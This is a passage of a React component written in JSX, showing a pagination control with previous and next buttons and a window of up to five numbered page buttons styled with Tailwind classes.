                                                        onClick={() => setCurrentPage(prev => Math.max(prev - 1, 1))}
                                                        disabled={currentPage === 1}
                                                        className="p-2 hover:bg-[#28282A] rounded disabled:opacity-30 disabled:cursor-not-allowed transition-colors text-gray-400"
                                                        aria-label="Previous page"
                                                    >
                                                        <ChevronLeft className="w-4 h-4" strokeWidth={2} />
                                                    </button>

                                                    {Array.from({ length: Math.min(5, totalPages) }, (_, i) => {
                                                        let pageNum;
                                                        if (totalPages <= 5) {
                                                            pageNum = i + 1;
                                                        } else if (currentPage <= 3) {
                                                            pageNum = i + 1;
                                                        } else if (currentPage >= totalPages - 2) {
                                                            pageNum = totalPages - 4 + i;
                                                        } else {
                                                            pageNum = currentPage - 2 + i;
                                                        }

                                                        return (
                                                            <button
                                                                key={pageNum}
                                                                onClick={() => setCurrentPage(pageNum)}
                                                                className={`min-w-[32px] h-8 rounded text-sm font-medium transition-colors ${currentPage === pageNum
                                                                    ? 'bg-[#f0b100] text-black'
                                                                    : 'hover:bg-[#28282A] text-gray-400 hover:text-gray-300'
                                                                    }`}
                                                            >
                                                                {pageNum}
                                                            </button>
                                                        );
                                                    })}

                                                    <button
                                                        onClick={() => setCurrentPage(prev => Math.min(prev + 1, totalPages))}
                                                        disabled={currentPage === totalPages}
                                                        className="p-2 hover:bg-[#28282A] rounded disabled:opacity-30 disabled:cursor-not-allowed transition-colors text-gray-400"
                                                        aria-label="Next page"
                                                    >
                                                        <ChevronRight className="w-4 h-4" strokeWidth={2} />
                                                    </button>
                                                </div>
                                            </div>
                                        )}
                                </div>
                            )}
                        </div>
                        </>
                    )}
                </div>
            </main>
        </div>
    );
}
